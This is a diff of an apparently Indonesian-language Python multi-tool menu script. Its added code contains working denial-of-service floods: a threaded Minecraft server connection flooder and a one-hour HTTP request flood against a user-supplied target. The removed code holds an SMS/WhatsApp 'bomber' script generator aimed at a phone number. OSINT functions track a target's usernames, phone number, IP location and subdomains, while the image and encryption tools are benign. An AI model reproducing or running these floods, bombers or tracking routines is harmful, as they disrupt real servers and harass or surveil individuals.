+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        sent = 0
+        
+        def mc_ping():
+            nonlocal stop_attack, sent
+            while not stop_attack:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect((server, port))
+                    s.send(b"\x00\x00\x00\x00")
+                    sent += 1
+                    s.close()
+                except:
+                    pass
+        
+        def mc_connect():
+            nonlocal stop_attack, sent
+            while not stop_attack:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect((server, port))
+                    s.send(b"\x00" * 100)
+                    sent += 1
+                    s.close()
+                except:
+                    pass
+        
+        thread_list = []
+        for i in range(threads):
+            if i % 2 == 0:
+                t = threading.Thread(target=mc_ping)
+            else:
+                t = threading.Thread(target=mc_connect)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while True:
+                time.sleep(1)
+                print(colored(f"[✓] PACKET SENT: {sent}", 'green'), end='\r')
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
+    
+    elif choice == "10":
+        # Web 1 Jam
+        target = input(colored("Target URL: ", 'yellow')).strip()
+        if not target.startswith('http'):
+            target = 'http://' + target
+        threads = int(input(colored("Threads [500]: ", 'yellow')).strip() or "500")
+        
+        print(colored(f"\n[✓] WEB ATTACK 1 JAM KE {target}!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        end_time = time.time() + 3600
+        stop_attack = False
+        sent = 0
+        
+        def attack():
+            nonlocal stop_attack, sent
+            while time.time() < end_time and not stop_attack:
+                try:
+                    requests.get(target, timeout=2)
+                    sent += 1
+                except:
+                    pass
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=attack)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while time.time() < end_time and not stop_attack:
+                remaining = int(end_time - time.time())
+                print(colored(f"[✓] SISA {remaining//60}m {remaining%60}s | PACKET: {sent}", 'green'), end='\r')
+                time.sleep(1)
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED EARLY - TOTAL: {sent} PACKET", 'yellow'))
+        else:
+            print(colored(f"\n\n[✓] ATTACK SELESAI 1 JAM! TOTAL: {sent} PACKET", 'green'))
+    
+    elif choice == "11":
+        # Minecraft 1 Jam
+        server = input(colored("Server IP: ", 'yellow')).strip()
+        port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
+        threads = int(input(colored("Threads [500]: ", 'yellow')).strip() or "500")
+        
+        print(colored(f"\n[✓] MC ATTACK 1 JAM KE {server}:{port}!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        end_time = time.time() + 3600
+        stop_attack = False
+        sent = 0
+        
+        def attack():
+            nonlocal stop_attack, sent
+            while time.time() < end_time and not stop_attack:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect((server, port))
+                    s.send(b"\x00" * 100)
+                    sent += 1
+                    s.close()
+                except:
+                    pass
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=attack)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while time.time() < end_time and not stop_attack:
+                remaining = int(end_time - time.time())
+                print(colored(f"[✓] SISA {remaining//60}m {remaining%60}s | PACKET: {sent}", 'green'), end='\r')
+                time.sleep(1)
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED EARLY - TOTAL: {sent} PACKET", 'yellow'))
+        else:
+            print(colored(f"\n\n[✓] ATTACK SELESAI 1 JAM! TOTAL: {sent} PACKET", 'green'))
+    
+    else:
+        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
+    
+    save_result("ddos.log", f"Type: {choice} | Target: {target if 'target' in locals() else server if 'server' in locals() else 'N/A'}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 4: BOMBER TOOLS ==================
+# ================== FITUR 4: OSINT & TRACKING ==================
 def fitur_4():
     os.system('clear')
-    print(colored("\n[4] BOMBER TOOLS", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Generate Bomber Script]", 'yellow'))
-    
-    number = input(colored("Target nomor (contoh: 628xxx): ", 'yellow')).strip()
-    
-    print(colored("\nPilih tipe bomber:", 'cyan'))
-    bombers = {
-        "1": ("SMS Bomber", "sms"),
-        "2": ("Call Bomber", "call"),
-        "3": ("WhatsApp Bomber", "wa"),
-        "4": ("Email Bomber", "email"),
-        "5": ("Telegram Bomber", "tg")
-    }
-    
-    for key, (name, btype) in bombers.items():
-        print(colored(f"   {key}. {name}", 'white'))
-    
-    choice = input(colored("\nPilih tipe [1-5]: ", 'yellow')).strip()
-    
-    if choice not in bombers:
-        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
-        input("\nEnter...")
-        return
-    
-    count = input(colored("Jumlah serangan [default 10]: ", 'yellow')).strip() or "10"
-    
-    # Generate bomber script
-    script = f'''import requests
-import time
-import threading
-
-target = "{number}"
-count = int({count})
-
-# API endpoints untuk bomber (contoh, perlu disesuaikan)
-apis = [
-    "https://api.example1.com/send",
-    "https://api.example2.com/otp",
-    "https://api.example3.com/verify"
-]
-
-def send_sms():
-    for _ in range(count):
-        for api in apis:
-            try:
-                requests.post(api, data={{"phone": target}}, timeout=2)
-            except:
-                pass
-        time.sleep(1)
-
-threads = []
-for _ in range(10):
-    t = threading.Thread(target=send_sms)
-    t.start()
-    threads.append(t)
-
-for t in threads:
-    t.join()
-'''
-    
-    filename = f"bomber_{bombers[choice][1]}_{int(time.time())}.py"
-    with open(filename, "w") as f:
-        f.write(script)
-    
-    print(colored(f"\n[BOMBER SCRIPT GENERATED]", 'green', attrs=['bold']))
-    print(colored(f"   File: {filename}", 'cyan'))
-    print(colored(f"   Target: {number}", 'cyan'))
-    print(colored(f"   Tipe: {bombers[choice][0]}", 'cyan'))
-    print(colored(f"   Jumlah: {count}x", 'cyan'))
-    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
-    print(colored("[INFO] Note: Ganti API endpoints dengan yang real", 'yellow'))
-    
-    save_result("bomber.log", f"Target: {number} | Type: {bombers[choice][0]} | Count: {count}")
-    input("\nPress Enter to continue...")
-
-# ================== FITUR 5: OSINT & TRACKING ==================
-def fitur_5():
-    os.system('clear')
-    print(colored("\n[5] OSINT & TRACKING", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Information Gathering]", 'yellow'))
+    print(colored("\n[4] OSINT & TRACKING", 'cyan', attrs=['bold']))
+    print(colored("   [INFORMATION GATHERING]", 'yellow'))
     
     target = input(colored("Target (username/email/phone): ", 'yellow')).strip()
     
@@ -882,125 +1118,198 @@ def fitur_5():
         input("\nEnter...")
         return
     
-    # Generate OSINT script
     if choice == "1":  # Username search
-        script = f'''import requests
-import json
-
-target = "{target}"
-
-sites = {{
-    "github": f"https://github.com/{{target}}",
-    "twitter": f"https://twitter.com/{{target}}",
-    "instagram": f"https://instagram.com/{{target}}",
-    "facebook": f"https://facebook.com/{{target}}",
-    "tiktok": f"https://tiktok.com/@{{target}}"
-}}
-
-results = {{}}
-for site, url in sites.items():
-    try:
-        r = requests.get(url, timeout=5)
-        results[site] = r.status_code == 200
-    except:
-        results[site] = False
-
-print(json.dumps(results, indent=2))
-with open(f"osint_{{target}}.json", "w") as f:
-    json.dump(results, f)
-'''
+        print(colored(f"\n[MENCARI USERNAME {target} DI SOSIAL MEDIA]", 'cyan'))
+        sites = {
+            "Facebook": f"https://facebook.com/{target}",
+            "Instagram": f"https://instagram.com/{target}",
+            "Twitter": f"https://twitter.com/{target}",
+            "TikTok": f"https://tiktok.com/@{target}",
+            "GitHub": f"https://github.com/{target}"
+        }
+        
+        found = []
+        for site, url in sites.items():
+            try:
+                r = requests.get(url, timeout=5, allow_redirects=True)
+                if r.status_code == 200:
+                    # Cek apakah benar-benar halaman user (bukan not found)
+                    if "not found" not in r.text.lower() and "404" not in r.text.lower() and "halaman tidak ditemukan" not in r.text.lower():
+                        print(colored(f"[✓] Ditemukan di {site}: {url}", 'green'))
+                        found.append(site)
+                    else:
+                        print(colored(f"[✗] Tidak ditemukan di {site}", 'red'))
+                else:
+                    print(colored(f"[✗] Tidak ditemukan di {site}", 'red'))
+            except Exception as e:
+                print(colored(f"[✗] Gagal cek {site}: {str(e)[:30]}", 'red'))
+        
+        save_result("osint.log", f"Username: {target} | Found: {', '.join(found) if found else 'None'}")
+    
     elif choice == "2":  # Email lookup
-        script = f'''import requests
-import hashlib
-
-target = "{target}"
-
-# Check HaveIBeenPwned
-email_hash = hashlib.sha1(target.encode()).hexdigest().upper()
-r = requests.get(f"https://api.pwnedpasswords.com/range/{{email_hash[:5]}}")
-if email_hash[5:] in r.text:
-    print("[!] Email found in breach database")
-
-# Generate report
-with open(f"email_{{target}}.txt", "w") as f:
-    f.write(f"Target: {{target}}\\nBreach check completed")
-'''
+        print(colored(f"\n[MENCARI INFORMASI EMAIL {target}]", 'cyan'))
+        
+        # Cek format email
+        if '@' not in target or '.' not in target:
+            print(colored("[✗] Format email tidak valid", 'red'))
+        else:
+            # Cek breach via HaveIBeenPwned API
+            try:
+                email_hash = hashlib.sha1(target.lower().encode()).hexdigest().upper()
+                prefix = email_hash[:5]
+                suffix = email_hash[5:]
+                
+                r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=5)
+                if r.status_code == 200:
+                    if suffix in r.text:
+                        print(colored("[!] EMAIL DITEMUKAN DI DATA BREACH!", 'red'))
+                        print(colored("    Password mungkin telah bocor", 'yellow'))
+                    else:
+                        print(colored("[✓] Email tidak ditemukan di database breach", 'green'))
+                else:
+                    print(colored("[✗] Gagal cek breach database", 'red'))
+            except Exception as e:
+                print(colored(f"[✗] Gagal cek breach: {str(e)[:30]}", 'red'))
+            
+            # Cek domain email
+            domain = target.split('@')[1]
+            try:
+                mx_records = socket.gethostbyname(domain)
+                print(colored(f"[✓] Domain {domain} valid (IP: {mx_records})", 'green'))
+            except:
+                print(colored(f"[✗] Domain {domain} tidak valid", 'red'))
+    
     elif choice == "3":  # Phone number
-        script = f'''import requests
-
-target = "{target}"
-
-# Phone number validation
-if target.startswith("62") and len(target) >= 10:
-    print(f"[+] Nomor valid: {{target}}")
-    print(f"[+] Provider: Telkomsel/Indosat/XL (cek manually)")
-    print(f"[+] Format internasional: +{{target}}")
+        print(colored(f"\n[INFORMASI NOMOR {target}]", 'cyan'))
+        
+        # Validasi nomor Indonesia
+        if target.startswith("62") and len(target) >= 10 and len(target) <= 13:
+            # Deteksi provider berdasarkan prefix
+            prefix = target[:5]
+            provider = "Unknown"
+            
+            # Telkomsel
+            if any(prefix.startswith(p) for p in ["62811", "62812", "62813", "62821", "62822", "62823"]):
+                provider = "Telkomsel"
+            # Indosat
+            elif any(prefix.startswith(p) for p in ["62814", "62815", "62855", "62856", "62857"]):
+                provider = "Indosat Ooredoo"
+            # XL
+            elif any(prefix.startswith(p) for p in ["62817", "62818", "62819", "62877", "62878", "62879"]):
+                provider = "XL Axiata"
+            # Tri
+            elif any(prefix.startswith(p) for p in ["62895", "62896", "62897", "62898"]):
+                provider = "Tri Indonesia"
+            # Smartfren
+            elif any(prefix.startswith(p) for p in ["62881", "62882", "62883", "62884", "62885", "62886", "62887", "62888", "62889"]):
+                provider = "Smartfren"
+            
+            print(colored(f"[✓] Nomor: {target}", 'green'))
+            print(colored(f"[✓] Format internasional: +{target}", 'green'))
+            print(colored(f"[✓] Provider: {provider}", 'green'))
+            print(colored(f"[✓] Jumlah digit: {len(target)}", 'green'))
+            
+            # Cek ketersediaan di WhatsApp
+            print(colored("\n[✓] Mengecek WhatsApp...", 'cyan'))
+            try:
+                wa_check = requests.get(f"https://wa.me/{target}", timeout=5)
+                if wa_check.status_code == 200:
+                    if "this phone number is not registered" not in wa_check.text.lower():
+                        print(colored(f"[✓] Nomor terdaftar di WhatsApp", 'green'))
+                    else:
+                        print(colored(f"[✗] Nomor tidak terdaftar di WhatsApp", 'yellow'))
+                else:
+                    print(colored(f"[?] Tidak bisa memverifikasi WhatsApp", 'yellow'))
+            except:
+                print(colored(f"[?] Tidak bisa memverifikasi WhatsApp", 'yellow'))
+        else:
+            print(colored("[✗] Nomor tidak valid (harus 62xx dan 10-13 digit)", 'red'))
     
-with open(f"phone_{{target}}.txt", "w") as f:
-    f.write(f"Phone: {{target}}\\nCheck completed")
-'''
     elif choice == "4":  # IP geolocation
-        script = f'''import requests
-
-target = "{target}"
-
-# IP geolocation API
-r = requests.get(f"http://ip-api.com/json/{{target}}")
-data = r.json()
-
-print(f"IP: {{data.get('query')}}")
-print(f"Country: {{data.get('country')}}")
-print(f"City: {{data.get('city')}}")
-print(f"ISP: {{data.get('isp')}}")
-print(f"Lat/Lon: {{data.get('lat')}}, {{data.get('lon')}}")
-
-with open(f"ip_{{target}}.json", "w") as f:
-    f.write(r.text)
-'''
+        print(colored(f"\n[GEOLOKASI IP {target}]", 'cyan'))
+        
+        # Validasi format IP
+        import ipaddress
+        try:
+            ipaddress.ip_address(target)
+            
+            # Gunakan ip-api.com (free, no API key)
+            try:
+                r = requests.get(f"http://ip-api.com/json/{target}", timeout=5)
+                if r.status_code == 200:
+                    data = r.json()
+                    if data.get('status') == 'success':
+                        print(colored(f"IP: {data.get('query')}", 'white'))
+                        print(colored(f"Negara: {data.get('country')} ({data.get('countryCode')})", 'white'))
+                        print(colored(f"Region: {data.get('regionName')}", 'white'))
+                        print(colored(f"Kota: {data.get('city')}", 'white'))
+                        print(colored(f"Kode Pos: {data.get('zip', 'N/A')}", 'white'))
+                        print(colored(f"ISP: {data.get('isp')}", 'white'))
+                        print(colored(f"Organisasi: {data.get('org', 'N/A')}", 'white'))
+                        print(colored(f"AS: {data.get('as', 'N/A')}", 'white'))
+                        print(colored(f"Lat/Lon: {data.get('lat')}, {data.get('lon')}", 'white'))
+                        print(colored(f"Timezone: {data.get('timezone')}", 'white'))
+                    else:
+                        print(colored(f"[✗] Gagal mendapatkan lokasi: {data.get('message', 'Unknown error')}", 'red'))
+                else:
+                    print(colored("[✗] Gagal koneksi ke API geolokasi", 'red'))
+            except Exception as e:
+                print(colored(f"[✗] Error: {str(e)[:30]}", 'red'))
+                
+        except ValueError:
+            print(colored("[✗] Format IP tidak valid", 'red'))
+    
     else:  # Domain recon
-        script = f'''import socket
-import requests
-
-target = "{target}"
-
-# DNS lookup
-try:
-    ip = socket.gethostbyname(target)
-    print(f"IP Address: {{ip}}")
-except:
-    print("DNS lookup failed")
-
-# Subdomain check
-subdomains = ["www", "mail", "admin", "blog", "api"]
-for sub in subdomains:
-    try:
-        sub_ip = socket.gethostbyname(f"{{sub}}.{{target}}")
-        print(f"{{sub}}.{{target}} -> {{sub_ip}}")
-    except:
-        pass
-
-with open(f"domain_{{target}}.txt", "w") as f:
-    f.write(f"Domain: {{target}}\\nIP: {{ip}}")
-'''
-    
-    filename = f"osint_{osint_types[choice][1]}_{int(time.time())}.py"
-    with open(filename, "w") as f:
-        f.write(script)
-    
-    print(colored(f"\n[OSINT SCRIPT GENERATED]", 'green', attrs=['bold']))
-    print(colored(f"   File: {filename}", 'cyan'))
-    print(colored(f"   Target: {target}", 'cyan'))
-    print(colored(f"   Tipe: {osint_types[choice][0]}", 'cyan'))
-    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
+        print(colored(f"\n[RECONNAISSANCE DOMAIN {target}]", 'cyan'))
+        
+        # Cek format domain
+        if '.' not in target:
+            print(colored("[✗] Format domain tidak valid", 'red'))
+        else:
+            # DNS lookup
+            try:
+                ip = socket.gethostbyname(target)
+                print(colored(f"[✓] IP Address: {ip}", 'green'))
+                
+                # WHOIS lookup
+                if WHOIS_AVAILABLE:
+                    try:
+                        w = whois.whois(target)
+                        print(colored(f"\n[✓] Registrar: {w.registrar}", 'green'))
+                        print(colored(f"[✓] Creation Date: {w.creation_date}", 'green'))
+                        print(colored(f"[✓] Expiration Date: {w.expiration_date}", 'green'))
+                    except:
+                        pass
+                
+                # Cek subdomain umum
+                print(colored("\n[✓] Mencari subdomain umum...", 'cyan'))
+                subdomains = ["www", "mail", "admin", "blog", "api", "ftp", "cpanel", "webmail", "ns1", "ns2"]
+                found_sub = []
+                
+                for sub in subdomains:
+                    try:
+                        sub_ip = socket.gethostbyname(f"{sub}.{target}")
+                        print(colored(f"[✓] {sub}.{target} -> {sub_ip}", 'green'))
+                        found_sub.append(sub)
+                    except:
+                        pass
+                
+                if not found_sub:
+                    print(colored("[✗] Tidak ada subdomain umum yang ditemukan", 'yellow'))
+                
+            except socket.gaierror:
+                print(colored("[✗] Domain tidak dapat di-resolve", 'red'))
+            except Exception as e:
+                print(colored(f"[✗] Error: {str(e)[:30]}", 'red'))
     
     save_result("osint.log", f"Target: {target} | Type: {osint_types[choice][0]}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 6: DEEPFAKE & IMAGE TOOLS ==================
-def fitur_6():
+# ================== FITUR 5: IMAGE TOOLS ==================
+def fitur_5():
     os.system('clear')
-    print(colored("\n[6] DEEPFAKE & IMAGE TOOLS", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Image Manipulation]", 'yellow'))
+    print(colored("\n[5] IMAGE TOOLS", 'cyan', attrs=['bold']))
+    print(colored("   [MANIPULASI GAMBAR]", 'yellow'))
     
     if not PILLOW_AVAILABLE:
         print(colored("\n[ERROR] Pillow tidak terinstall!", 'red'))
@@ -1008,153 +1317,179 @@ def fitur_6():
         input("\nEnter...")
         return
     
-    print(colored("\nPilih operasi gambar:", 'cyan'))
-    image_ops = {
-        "1": ("Convert Image Format", "convert"),
-        "2": ("Resize Image", "resize"),
-        "3": ("Apply Filter", "filter"),
-        "4": ("Add Text/Watermark", "text"),
-        "5": ("Steganography (Hide Data)", "stego")
-    }
+    print(colored("\nPilih operasi:", 'cyan'))
+    print("1. Convert Format Gambar")
+    print("2. Resize Gambar")
+    print("3. Apply Filter")
+    print("4. Tambah Text/Watermark")
+    print("5. Steganography (Sembunyikan Data)")
     
-    for key, (name, op) in image_ops.items():
-        print(colored(f"   {key}. {name}", 'white'))
+    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
     
-    choice = input(colored("\nPilih operasi [1-5]: ", 'yellow')).strip()
-    
-    if choice not in image_ops:
+    if choice not in ["1","2","3","4","5"]:
         print(colored("[ERROR] Pilihan tidak valid!", 'red'))
         input("\nEnter...")
         return
     
-    # Generate image manipulation script
-    if choice == "1":  # Convert format
-        script = '''from PIL import Image
-import sys
-
-input_file = input("Path gambar input: ").strip()
-output_format = input("Format output (jpg/png/bmp): ").strip()
-
-try:
-    img = Image.open(input_file)
-    output_file = f"converted_{int(time.time())}.{output_format}"
-    img.save(output_file)
-    print(f"[+] Saved: {output_file}")
-except Exception as e:
-    print(f"Error: {e}")
-'''
-    elif choice == "2":  # Resize
-        script = '''from PIL import Image
-import sys
-
-input_file = input("Path gambar input: ").strip()
-width = int(input("Width: ").strip() or "800")
-height = int(input("Height: ").strip() or "600")
-
-try:
-    img = Image.open(input_file)
-    img_resized = img.resize((width, height))
-    output_file = f"resized_{int(time.time())}.jpg"
-    img_resized.save(output_file)
-    print(f"[+] Resized to {width}x{height}: {output_file}")
-except Exception as e:
-    print(f"Error: {e}")
-'''
-    elif choice == "3":  # Apply filter
-        script = '''from PIL import Image, ImageFilter
-import sys
-
-input_file = input("Path gambar input: ").strip()
-filters = {
-    "1": ImageFilter.BLUR,
-    "2": ImageFilter.CONTOUR,
-    "3": ImageFilter.DETAIL,
-    "4": ImageFilter.EDGE_ENHANCE,
-    "5": ImageFilter.EMBOSS,
-    "6": ImageFilter.SHARPEN
-}
-
-print("Filters:\\n1. BLUR\\n2. CONTOUR\\n3. DETAIL\\n4. EDGE_ENHANCE\\n5. EMBOSS\\n6. SHARPEN")
-filter_choice = input("Pilih filter [1-6]: ").strip()
-
-try:
-    img = Image.open(input_file)
-    img_filtered = img.filter(filters[filter_choice])
-    output_file = f"filtered_{int(time.time())}.jpg"
-    img_filtered.save(output_file)
-    print(f"[+] Filter applied: {output_file}")
-except Exception as e:
-    print(f"Error: {e}")
-'''
-    elif choice == "4":  # Add text
-        script = '''from PIL import Image, ImageDraw, ImageFont
-import sys
-
-input_file = input("Path gambar input: ").strip()
-text = input("Text to add: ").strip()
-
-try:
-    img = Image.open(input_file)
-    draw = ImageDraw.Draw(img)
-    draw.text((10, 10), text, fill=(255,0,0))
-    output_file = f"watermarked_{int(time.time())}.jpg"
-    img.save(output_file)
-    print(f"[+] Text added: {output_file}")
-except Exception as e:
-    print(f"Error: {e}")
-'''
-    else:  # Steganography
-        script = '''from PIL import Image
-import sys
-
-def encode_image(img, data):
-    # Simple LSB steganography
-    binary = ''.join(format(ord(i), '08b') for i in data) + '1111111111111110'
-    pixels = list(img.getdata())
-    new_pixels = []
-    data_index = 0
+    file_path = input(colored("Path gambar: ", 'yellow')).strip()
     
-    for pixel in pixels:
-        if data_index < len(binary):
-            r = (pixel[0] & 0xFE) | int(binary[data_index])
-            new_pixels.append((r, pixel[1], pixel[2]))
-            data_index += 1
-        else:
-            new_pixels.append(pixel)
+    if not os.path.exists(file_path):
+        print(colored("[ERROR] File tidak ditemukan!", 'red'))
+        input("\nEnter...")
+        return
     
-    img.putdata(new_pixels)
-    return img
-
-input_file = input("Path gambar input: ").strip()
-data = input("Data to hide: ").strip()
-
-try:
-    img = Image.open(input_file).convert('RGB')
-    encoded = encode_image(img, data)
-    output_file = f"stego_{int(time.time())}.png"
-    encoded.save(output_file)
-    print(f"[+] Data hidden: {output_file}")
-except Exception as e:
-    print(f"Error: {e}")
-'''
+    try:
+        img = Image.open(file_path)
+        print(colored(f"[✓] Gambar berhasil dibuka: {img.size[0]}x{img.size[1]}", 'green'))
+        
+        if choice == "1":  # Convert
+            print("\nFormat tersedia: jpg, png, bmp, gif, webp")
+            output_format = input("Format output: ").strip().lower()
+            if output_format not in ['jpg', 'jpeg', 'png', 'bmp', 'gif', 'webp']:
+                print(colored("[ERROR] Format tidak didukung", 'red'))
+            else:
+                if output_format == 'jpg':
+                    output_format = 'jpeg'
+                output = f"converted_{int(time.time())}.{output_format}"
+                
+                # Convert mode jika perlu
+                if output_format in ['jpeg'] and img.mode in ['RGBA', 'P']:
+                    img = img.convert('RGB')
+                
+                img.save(output)
+                print(colored(f"[✓] Tersimpan: {output}", 'green'))
+        
+        elif choice == "2":  # Resize
+            try:
+                width = int(input("Width: ") or str(img.size[0]))
+                height = int(input("Height: ") or str(img.size[1]))
+                
+                if width <= 0 or height <= 0:
+                    print(colored("[ERROR] Dimensi harus positif", 'red'))
+                else:
+                    img_resized = img.resize((width, height), Image.Resampling.LANCZOS)
+                    output = f"resized_{int(time.time())}.jpg"
+                    if img.mode in ['RGBA', 'P']:
+                        img_resized = img_resized.convert('RGB')
+                    img_resized.save(output)
+                    print(colored(f"[✓] Resize ke {width}x{height}: {output}", 'green'))
+            except ValueError:
+                print(colored("[ERROR] Dimensi harus angka", 'red'))
+        
+        elif choice == "3":  # Filter
+            print("\nFilter tersedia:")
+            print("1. BLUR - Membuat gambar blur")
+            print("2. CONTOUR - Efek garis tepi")
+            print("3. DETAIL - Mempertajam detail")
+            print("4. EDGE_ENHANCE - Meningkatkan tepi")
+            print("5. EMBOSS - Efek timbul")
+            print("6. SHARPEN - Menajamkan gambar")
+            print("7. SMOOTH - Menghaluskan")
+            
+            filter_choice = input("Pilih filter [1-7]: ").strip()
+            
+            filters = {
+                "1": ImageFilter.BLUR,
+                "2": ImageFilter.CONTOUR,
+                "3": ImageFilter.DETAIL,
+                "4": ImageFilter.EDGE_ENHANCE,
+                "5": ImageFilter.EMBOSS,
+                "6": ImageFilter.SHARPEN,
+                "7": ImageFilter.SMOOTH
+            }
+            
+            if filter_choice in filters:
+                img_filtered = img.filter(filters[filter_choice])
+                output = f"filtered_{int(time.time())}.jpg"
+                if img_filtered.mode in ['RGBA', 'P']:
+                    img_filtered = img_filtered.convert('RGB')
+                img_filtered.save(output)
+                print(colored(f"[✓] Filter applied: {output}", 'green'))
+            else:
+                print(colored("[ERROR] Pilihan filter tidak valid", 'red'))
+        
+        elif choice == "4":  # Text
+            text = input("Text to add: ")
+            if not text:
+                print(colored("[ERROR] Text tidak boleh kosong", 'red'))
+            else:
+                try:
+                    x = int(input("Posisi X [10]: ") or "10")
+                    y = int(input("Posisi Y [10]: ") or "10")
+                    
+                    draw = ImageDraw.Draw(img)
+                    draw.text((x, y), text, fill=(255, 0, 0))
+                    
+                    output = f"watermarked_{int(time.time())}.jpg"
+                    if img.mode in ['RGBA', 'P']:
+                        img = img.convert('RGB')
+                    img.save(output)
+                    print(colored(f"[✓] Text added: {output}", 'green'))
+                except ValueError:
+                    print(colored("[ERROR] Posisi harus angka", 'red'))
+        
+        else:  # Steganography
+            data = input("Data to hide: ")
+            if not data:
+                print(colored("[ERROR] Data tidak boleh kosong", 'red'))
+            else:
+                print(colored("[✓] Menyembunyikan data dalam gambar...", 'cyan'))
+                
+                # Simple LSB implementation
+                # Convert data to binary
+                binary_data = ''.join(format(ord(c), '08b') for c in data)
+                binary_data += '1111111111111110'  # EOF marker
+                
+                # Get image data
+                pixels = list(img.getdata())
+                width, height = img.size
+                
+                if len(binary_data) > len(pixels) * 3:
+                    print(colored("[ERROR] Data terlalu besar untuk gambar ini", 'red'))
+                else:
+                    new_pixels = []
+                    data_idx = 0
+                    
+                    for pixel in pixels:
+                        if data_idx < len(binary_data):
+                            if isinstance(pixel, int):  # Grayscale
+                                new_val = (pixel & 0xFE) | int(binary_data[data_idx])
+                                new_pixels.append(new_val)
+                                data_idx += 1
+                            else:  # RGB/RGBA
+                                r = (pixel[0] & 0xFE) | int(binary_data[data_idx]) if data_idx < len(binary_data) else pixel[0]
+                                data_idx += 1
+                                g = (pixel[1] & 0xFE) | int(binary_data[data_idx]) if data_idx < len(binary_data) else pixel[1]
+                                data_idx += 1
+                                b = (pixel[2] & 0xFE) | int(binary_data[data_idx]) if data_idx < len(binary_data) else pixel[2]
+                                data_idx += 1
+                                
+                                if len(pixel) == 4:  # RGBA
+                                    new_pixels.append((r, g, b, pixel[3]))
+                                else:  # RGB
+                                    new_pixels.append((r, g, b))
+                        else:
+                            new_pixels.append(pixel)
+                    
+                    # Create new image
+                    img_stego = Image.new(img.mode, (width, height))
+                    img_stego.putdata(new_pixels)
+                    
+                    output = f"stego_{int(time.time())}.png"
+                    img_stego.save(output)
+                    print(colored(f"[✓] Data hidden: {output}", 'green'))
+                    print(colored(f"[✓] Panjang data: {len(data)} karakter", 'green'))
     
-    filename = f"image_{image_ops[choice][1]}_{int(time.time())}.py"
-    with open(filename, "w") as f:
-        f.write(script)
+    except Exception as e:
+        print(colored(f"[ERROR] {str(e)}", 'red'))
     
-    print(colored(f"\n[IMAGE SCRIPT GENERATED]", 'green', attrs=['bold']))
-    print(colored(f"   File: {filename}", 'cyan'))
-    print(colored(f"   Operasi: {image_ops[choice][0]}", 'cyan'))
-    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
-    
-    save_result("image_tools.log", f"Operation: {image_ops[choice][0]}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 7: ENCRYPT & DECRYPT ==================
-def fitur_7():
+# ================== FITUR 6: ENCRYPT & DECRYPT ==================
+def fitur_6():
     os.system('clear')
-    print(colored("\n[7] ENCRYPT & DECRYPT", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Cryptography Tools]", 'yellow'))
+    print(colored("\n[6] ENCRYPT & DECRYPT", 'cyan', attrs=['bold']))
+    print(colored("   [KRIPTOGRAFI]", 'yellow'))
     
     if not CRYPTO_AVAILABLE:
         print(colored("\n[ERROR] Cryptography tidak terinstall!", 'red'))
@@ -1163,373 +1498,501 @@ def fitur_7():
         return
     
     print(colored("\nPilih operasi:", 'cyan'))
-    crypto_ops = {
-        "1": ("Encrypt File/Text", "encrypt"),
-        "2": ("Decrypt File/Text", "decrypt"),
-        "3": ("Generate Key", "key"),
-        "4": ("Hash Generator (MD5/SHA)", "hash"),
-        "5": ("Base64 Encode/Decode", "base64")
-    }
+    print("1. Encrypt File/Text")
+    print("2. Decrypt File/Text")
+    print("3. Generate Key")
+    print("4. Hash Generator (MD5/SHA)")
+    print("5. Base64 Encode/Decode")
     
-    for key, (name, op) in crypto_ops.items():
-        print(colored(f"   {key}. {name}", 'white'))
-    
-    choice = input(colored("\nPilih operasi [1-5]: ", 'yellow')).strip()
+    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
     
     if choice == "1":
-        data = input(colored("Text/File path to encrypt: ", 'yellow')).strip()
-        key = Fernet.generate_key()
-        cipher = Fernet(key)
-        
-        if os.path.exists(data):
-            with open(data, 'rb') as f:
-                encrypted = cipher.encrypt(f.read())
-            enc_file = f"encrypted_{os.path.basename(data)}"
-            with open(enc_file, 'wb') as f:
-                f.write(encrypted)
+        data = input("Text/File path: ").strip()
+        if not data:
+            print(colored("[ERROR] Input tidak boleh kosong", 'red'))
         else:
-            encrypted = cipher.encrypt(data.encode())
-            enc_file = f"encrypted_{int(time.time())}.txt"
-            with open(enc_file, 'w') as f:
-                f.write(encrypted.decode())
-        
-        key_file = f"key_{int(time.time())}.key"
-        with open(key_file, 'wb') as f:
-            f.write(key)
-        
-        print(colored(f"\n[ENCRYPTED] File: {enc_file}", 'green'))
-        print(colored(f"[KEY] Saved: {key_file}", 'green'))
